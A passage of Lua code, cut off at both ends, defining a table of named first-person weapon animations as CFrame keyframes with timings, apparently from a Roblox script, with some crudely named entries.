		    {CFrame = CFrame.new(0.3, 0, 0) * CFrame.Angles(math.rad(-2), math.rad(5), math.rad(25)), Time = 0.2},
            {CFrame = CFrame.new(0.69, -0.71, 0.6), Time = 0.2}
		},
		["Push"] = {
		    {CFrame = CFrame.new(0.2, -0.7, 0) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.2},
            {CFrame = CFrame.new(0.2, -1, 0) * CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111)), Time = 0.35}
		},
		["Flat"] = {
		    {CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(-30), math.rad(-80)), Time = 0.15},
            {CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(30), math.rad(-100)), Time = 0.15}
		},
		["Dortware"] = {
		    {CFrame = CFrame.new(-0.3, -0.53, -0.6) * CFrame.Angles(math.rad(160), math.rad(127), math.rad(90)), Time = 0.1},
			{CFrame = CFrame.new(-0.3, -0.53, -0.6) * CFrame.Angles(math.rad(160), math.rad(127), math.rad(90)), Time = 0.6},
            {CFrame = CFrame.new(-0.3, -0.53, -0.6) * CFrame.Angles(math.rad(160), math.rad(127), math.rad(90)), Time = 0.6},
            {CFrame = CFrame.new(-0.27, -0.8, -1.2) * CFrame.Angles(math.rad(160), math.rad(90), math.rad(90)), Time = 0.8},
            {CFrame = CFrame.new(-0.27, -0.8, -1.2) * CFrame.Angles(math.rad(160), math.rad(80), math.rad(90)), Time = 1.2},
            {CFrame = CFrame.new(-0.01, -0.65, -0.8) * CFrame.Angles(math.rad(160), math.rad(111), math.rad(90)), Time = 0.6},
            {CFrame = CFrame.new(-0.01, -0.65, -0.8) * CFrame.Angles(math.rad(160), math.rad(111), math.rad(90)), Time = 0.6}
		},
		["Template"] = {
		    {CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.01},
            {CFrame = CFrame.new(-1.71, -1.11, -0.94) * CFrame.Angles(math.rad(-105), math.rad(85), math.rad(7)), Time = 0.19}
		},
		["Hamsterware"] = {
		    {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(40), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(70), math.rad(-135)), Time = 0.1}
		},
		["CatV5"] = {
		    {CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(25), math.rad(-60)), Time = 0.1},
			{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-40), math.rad(40), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(55), math.rad(-115)), Time = 0.1},
			{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-50), math.rad(70), math.rad(-60)), Time = 0.1},
            {CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(70), math.rad(-70)), Time = 0.1}
		},
		["Astral"] = {
		    {CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.15},
			{CFrame = CFrame.new(0.95, -1.06, -2.25) * CFrame.Angles(math.rad(-179), math.rad(61), math.rad(80)), Time = 0.15}
		},
		["Leaked"] = {
		    {CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(16), math.rad(59), math.rad(-90)), Time = 0.15}
		},
		["Slide2"] = {
		    {CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0},
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-171), math.rad(47), math.rad(74)), Time = 0.16}
		},
		["Femboy"] = {
		    {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(1), math.rad(-7), math.rad(7)), Time = 0},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-0), math.rad(0), math.rad(-0)), Time = 0.08},
			{CFrame = CFrame.new(-0.01, 0, 0) * CFrame.Angles(math.rad(-7), math.rad(-7), math.rad(-1)), Time = 0.08},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(1), math.rad(-7), math.rad(7)), Time = 0.11}
		},
		["MontCostume"] = {
		    {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.58) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.17},
            {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.05},
            {CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.05}
		},
		["CustomSP+"] = {
			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.13},
			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.03},
			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.09},
			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
			{CFrame = CFrame.new(0.39, 0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.13}
		},
		NewCatV5 = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-65), math.rad(55), math.rad(-70)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(-160), math.rad(60), math.rad(1)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-0), math.rad(0), math.rad(-0)), Time = -0.2},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-22), math.rad(56), math.rad(-106)), Time = 0.1}
		},
		Funny = {
			{CFrame = CFrame.new(0, 0, 1.5) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.15},
			{CFrame = CFrame.new(0, 0, -1.5) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.15},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.15},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-55), math.rad(0), math.rad(0)), Time = 0.15}
		},
		FunnyFuture = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-60), math.rad(0), math.rad(0)),Time = 0.25},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25}
		},
		Goofy = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.25},
			{CFrame = CFrame.new(-1, -1, 1) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-33)),Time = 0.25}
		},
		Future = {
			{CFrame = CFrame.new(0.69, -0.7, 0.10) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.20},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25}
		},
		Pop = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-30), math.rad(80), math.rad(-90)), Time = 0.35},
			{CFrame = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.35}
		},
		FunnyV2 = {
			{CFrame = CFrame.new(0.10, -0.5, -1) * CFrame.Angles(math.rad(295), math.rad(80), math.rad(300)), Time = 0.45},
			{CFrame = CFrame.new(-5, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.45},
			{CFrame = CFrame.new(5, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.45},
		},
		Smooth = {
			{CFrame = CFrame.new(-0.42, 0, 0.30) * CFrame.Angles(math.rad(0), math.rad(80), math.rad(60)), Time = 0.25},
			{CFrame = CFrame.new(-0.42, 0, 0.30) * CFrame.Angles(math.rad(0), math.rad(100), math.rad(60)), Time = 0.25},
			{CFrame = CFrame.new(-0.42, 0, 0.30) * CFrame.Angles(math.rad(0), math.rad(60), math.rad(60)), Time = 0.25},
		},
		FasterSmooth = {
			{CFrame = CFrame.new(-0.42, 0, 0.30) * CFrame.Angles(math.rad(0), math.rad(80), math.rad(60)), Time = 0.11},
			{CFrame = CFrame.new(-0.42, 0, 0.30) * CFrame.Angles(math.rad(0), math.rad(100), math.rad(60)), Time = 0.11},
			{CFrame = CFrame.new(-0.42, 0, 0.30) * CFrame.Angles(math.rad(0), math.rad(60), math.rad(60)), Time = 0.11},
		},
		PopV2 = {
			{CFrame = CFrame.new(0.10, -0.3, -0.30) * CFrame.Angles(math.rad(295), math.rad(80), math.rad(290)), Time = 0.09},
			{CFrame = CFrame.new(0.10, 0.10, -1) * CFrame.Angles(math.rad(295), math.rad(80), math.rad(300)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
		},
		Bob = {
			{CFrame = CFrame.new(-0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2},
			{CFrame = CFrame.new(-0.7, -2.5, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
		},
		Knife = {
			{CFrame = CFrame.new(-0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2},
			{CFrame = CFrame.new(1, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2},
			{CFrame = CFrame.new(4, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2},
		},
		FunnyExhibition = {
			{CFrame = CFrame.new(-1.5, -0.50, 0.20) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.10},
			{CFrame = CFrame.new(-0.55, -0.20, 1.5) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2},
		},
		Remake = {
			{CFrame = CFrame.new(-0.10, -0.45, -0.20) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-50)), Time = 0.01},
			{CFrame = CFrame.new(0.7, -0.71, -1) * CFrame.Angles(math.rad(-90), math.rad(50), math.rad(-38)), Time = 0.2},
			{CFrame = CFrame.new(0.63, -0.1, 1.50) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.15}
		},
		PopV3 = {
			{CFrame = CFrame.new(0.69, -0.10, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -2, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
		},
		Shake = {
			{CFrame = CFrame.new(0.69, -0.8, 0.6) * CFrame.Angles(math.rad(-60), math.rad(30), math.rad(-35)), Time = 0.05},
			{CFrame = CFrame.new(0.8, -0.71, 0.30) * CFrame.Angles(math.rad(-60), math.rad(39), math.rad(-55)), Time = 0.02},
			{CFrame = CFrame.new(0.8, -2, 0.45) * CFrame.Angles(math.rad(-60), math.rad(30), math.rad(-55)), Time = 0.03}
		},
		SlowerShake = {
			{CFrame = CFrame.new(0.69, -5, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
		},
		Idk = {
			{CFrame = CFrame.new(0, -0.1, -0.30) * CFrame.Angles(math.rad(-20), math.rad(20), math.rad(0)), Time = 0.30},
			{CFrame = CFrame.new(0, -0.50, -0.30) * CFrame.Angles(math.rad(-40), math.rad(41), math.rad(0)), Time = 0.32},
			{CFrame = CFrame.new(0, -0.1, -0.30) * CFrame.Angles(math.rad(-60), math.rad(0), math.rad(0)), Time = 0.32}
		},
	    ["Remake"] = {
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.2},
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.2},
			{CFrame = CFrame.new(0.95, -1.06, -2.25) * CFrame.Angles(math.rad(-179), math.rad(61), math.rad(80)), Time = 0.1}
		},
		["Prism"] = {
			{CFrame = CFrame.new(0.3, -2, .1) * CFrame.Angles(math.rad(190), math.rad(75), math.rad(90)), Time = 0.13},
			{CFrame = CFrame.new(0.3, -2, .2) * CFrame.Angles(math.rad(190), math.rad(95), math.rad(80)), Time = 0.13},
			{CFrame = CFrame.new(0.3, -2, .1) * CFrame.Angles(math.rad(120), math.rad(170), math.rad(90)), Time = 0.13},
		},
		["ass"] = {
			{CFrame = CFrame.new(1, -1, 2) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(190)), Time = 0.8},
			{CFrame = CFrame.new(-1, 1, -2.2) * CFrame.Angles(math.rad(200), math.rad(40), math.rad(1)), Time = 0.8}
		},
		["n1san1remake"] = {
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.2},
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.2},
			{CFrame = CFrame.new(0.95, -1.06, -2.25) * CFrame.Angles(math.rad(-179), math.rad(61), math.rad(80)), Time = 0.1}
		},
		["normalv2"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.09},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.09}
		},
		["sillydick"] = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
			{CFrame = CFrame.new(0.3, -2, 2) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.3}
		},
		["normalv3"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.06},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.05}
		},
		["prism"] = {
			{CFrame = CFrame.new(0.3, -2, .1) * CFrame.Angles(math.rad(190), math.rad(75), math.rad(90)), Time = 0.13},
			{CFrame = CFrame.new(0.3, -2, .2) * CFrame.Angles(math.rad(190), math.rad(95), math.rad(80)), Time = 0.13},
			{CFrame = CFrame.new(0.3, -2, .1) * CFrame.Angles(math.rad(120), math.rad(170), math.rad(90)), Time = 0.13},
		},
		["Custom+"] = {
			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.13},
			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.03},
			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.09},
			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
			{CFrame = CFrame.new(0.39, 0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.13}
		},
		["FastslowBETTER"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.8},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.01}
		},	
		["stavscum"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-45), math.rad(70), math.rad(-90)), Time = 0.07},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-89), math.rad(70), math.rad(-38)), Time = 0.13}
		},
		["meteor4"] = {
			{CFrame = CFrame.new(0.2, -0.7, 0) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.2},
			{CFrame = CFrame.new(0.2, -1, 0) * CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111)), Time = 0.35}
		},
		["meteor"] = {
			{CFrame = CFrame.new(0, 0, -1) * CFrame.Angles(math.rad(-40), math.rad(60), math.rad(-80)), Time = 0.17},
			{CFrame = CFrame.new(0, 0, -1) * CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-80)), Time = 0.17}
		},
		["meteor6"] = {
			{CFrame = CFrame.new(-0.4, -0.7, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.23},
			{CFrame = CFrame.new(-0.8, -0.9, -1.7) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.23},
			{CFrame = CFrame.new(-0.4, -0.7, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.23},
		},
		["astrolfo"] = {
			{CFrame = CFrame.new(-0.4, -0.7, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.23},
			{CFrame = CFrame.new(-0.8, -0.9, -1.7) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.23},
			{CFrame = CFrame.new(-0.4, -0.7, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.23},
			{CFrame = CFrame.new(-0.8, -0.9, -1.7) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.23},
			{CFrame = CFrame.new(-0.8, -0.6, -1) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.19},
		},
		["idkthesenames"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-89), math.rad(68), math.rad(-56)), Time = 0.12},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-65), math.rad(68), math.rad(-35)), Time = 0.19}
		},
		["sexy"] = {
			{CFrame = CFrame.new(0.3, -2, 0.5) * CFrame.Angles(math.rad(190), math.rad(110), math.rad(90)), Time = 0.3},
			{CFrame = CFrame.new(0.3, -1.5, 1.5) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.1}
		},
		["meteor2"] = {
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-70)), Time = 0.15},
			{CFrame = CFrame.new(0.5, -0.7, -0.2) * CFrame.Angles(math.rad(-120), math.rad(60), math.rad(-50)), Time = 0.15}
		},
		["smooth"] = {
			{CFrame = CFrame.new(1, 0, 0.5) * CFrame.Angles(math.rad(-90), math.rad(60), math.rad(-60)), Time = 0.2},
			{CFrame = CFrame.new(1, -0.2, -0.5) * CFrame.Angles(math.rad(-160), math.rad(60), math.rad(-30)), Time = 0.12}
		},
		["meteor7"] = {
			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-70)), Time = 0.15},
			{CFrame = CFrame.new(0.5, -0.7, -0.2) * CFrame.Angles(math.rad(-120), math.rad(60), math.rad(10)), Time = 0.14},
		},
		["meteor8"] = {
			{CFrame = CFrame.new(0.9, 0, 0) * CFrame.Angles(math.rad(-80), math.rad(60), math.rad(-40)), Time = 0.14},
			{CFrame = CFrame.new(0.5, -0.2, -0.7) * CFrame.Angles(math.rad(-150), math.rad(55), math.rad(20)), Time = 0.14},
		},
		["sexyfr"] = {
			{CFrame = CFrame.new(0.3, -2, 0.5) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
			{CFrame = CFrame.new(0.3, -1.5, 1.5) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.1}
		},
		["n1san1scum"] = {
			{CFrame = CFrame.new(0.7, -0.4, 0.612) * CFrame.Angles(math.rad(285), math.rad(65), math.rad(293)), Time = 0.13},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(210), math.rad(70), math.rad(3)), Time = 0.13}
		},
		["fatbitch"] = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(350), math.rad(45), math.rad(85)), Time = 0.12},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(350), math.rad(80), math.rad(60)), Time = 0.12},
		},
		["meteor3"] = {
			{CFrame = CFrame.new(-0.3, -0.53, -0.6) * CFrame.Angles(math.rad(160), math.rad(127), math.rad(90)), Time = 0.13},
			{CFrame = CFrame.new(-0.27, -0.8, -1.2) * CFrame.Angles(math.rad(160), math.rad(90), math.rad(90)), Time = 0.13},
			{CFrame = CFrame.new(-0.01, -0.65, -0.8) * CFrame.Angles(math.rad(160), math.rad(111), math.rad(90)), Time = 0.13},
		},
		["random"] = {
			{CFrame = CFrame.new(-0.06, -0.5, -1.03) * CFrame.Angles(math.rad(-39), math.rad(97), math.rad(-92)), Time = 0.2},
			{CFrame = CFrame.new(-0.05, -0.5, -1.03) * CFrame.Angles(math.rad(-39), math.rad(75), math.rad(-93)), Time = 0.3},
			{CFrame = CFrame.new(-0.03, -0.5, 0.4) * CFrame.Angles(math.rad(-39), math.rad(75), math.rad(-91)), Time = 0.2}
		},
		    ['1.8'] = {
		{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-65), math.rad(55), math.rad(-51)), Time = 0.12},
		{CFrame = CFrame.new(0.16, -1.16, 1) * CFrame.Angles(math.rad(-179), math.rad(54), math.rad(33)), Time = 0.12}
	},
    ["Blocking"] = {
        {CFrame = CFrame.new(-0.01, -3.51, -2.01) * CFrame.Angles(math.rad(-180), math.rad(85), math.rad(-180)), Time = 0}
    },
    ["Swag2"] = {
        {CFrame = CFrame.new(-0.3, -0.53, -0.6) * CFrame.Angles(math.rad(160), math.rad(127), math.rad(90)), Time = 0.1},
        {CFrame = CFrame.new(-0.3, -0.53, -0.6) * CFrame.Angles(math.rad(160), math.rad(127), math.rad(90)), Time = 0.13},
        {CFrame = CFrame.new(-0.27, -0.8, -1.2) * CFrame.Angles(math.rad(160), math.rad(90), math.rad(90)), Time = 0.13},
        {CFrame = CFrame.new(-0.01, -0.65, -0.8) * CFrame.Angles(math.rad(160), math.rad(111), math.rad(90)), Time = 0.13},
    },
	["Kawaii"] = {
		{CFrame = CFrame.new(-0.01, 0.49, -1.51) * CFrame.Angles(math.rad(90), math.rad(45), math.rad(-90)),Time = 0},
		{CFrame = CFrame.new(-0.01, 0.49, -1.51) * CFrame.Angles(math.rad(-51), math.rad(48), math.rad(24)),Time = 0.06},
		{CFrame = CFrame.new(-0.01, 0.49, -1.51) * CFrame.Angles(math.rad(90), math.rad(45), math.rad(-90)),Time = 0.06}
	},
	["Swank"] = {
		{CFrame = CFrame.new(-0.01, -.45, -0.7) * CFrame.Angles(math.rad(-0), math.rad(85), math.rad(0)),Time = 0.1},
        {CFrame = CFrame.new(-0.02, -.45, -0.7) * CFrame.Angles(math.rad(59), math.rad(19), math.rad(-37)),Time = 0.09},
	},
    ["Swank2"] = {
		{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.09},
		{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.09},
		{CFrame = CFrame.new(0.95, -1.06, -2.25) * CFrame.Angles(math.rad(-179), math.rad(61), math.rad(80)), Time = 0.15}
    },
    ["TenacityOld2"] = {
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(25), math.rad(-60)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-40), math.rad(40), math.rad(-90)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(55), math.rad(-115)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-50), math.rad(70), math.rad(-60)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(70), math.rad(-70)), Time = 0.1}
	},
    ["OldSwank3"] = {
		{CFrame = CFrame.new(1, -1, 2) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.4},
		{CFrame = CFrame.new(-1, 1, -2.2) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.4}
	},
    ["TenacityOld"] = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
		{CFrame = CFrame.new(0.3, -2, 2) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.3}
	},
    ["AstolfoNew"] = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
	},
    ["Exhibition Old"] = {
        {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
        {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.05},
        {CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.1},
        {CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
        {CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.15}
    },
    ["Exhibition"] = {
		{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
		{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
	},
    ['Sigma'] = {
        {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.05},
        {CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.05}
    },
    ["Sigma2"] = {
        {CFrame = CFrame.new(0.3, -0.8, -1.3) * CFrame.Angles(math.rad(160), math.rad(84), math.rad(90)), Time = 0.18},
        {CFrame = CFrame.new(0.3, -0.9, -1.17) * CFrame.Angles(math.rad(160), math.rad(70), math.rad(90)), Time = 0.18},
        {CFrame = CFrame.new(0.4, -0.65, -0.8) * CFrame.Angles(math.rad(160), math.rad(111), math.rad(90)), Time = 0.18}
    },
    ["Tap"] = {
        {CFrame = CFrame.new(5, -1, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), Time = 0.25},
        {CFrame = CFrame.new(5, -1, -0.3) * CFrame.Angles(math.rad(-100), math.rad(-30), math.rad(10)), Time = 0.25}
    },
    ["Swag"] = {
        {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(0)), Time = 0.08},
        {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(10), math.rad(70), math.rad(-90)), Time = 0.08},
    },
    ["Suicide"] = {
        {CFrame = CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.1},
        {CFrame = CFrame.new(-2.5, -1, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.05}
    },
    ["Goofy"] = {
        {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.10},
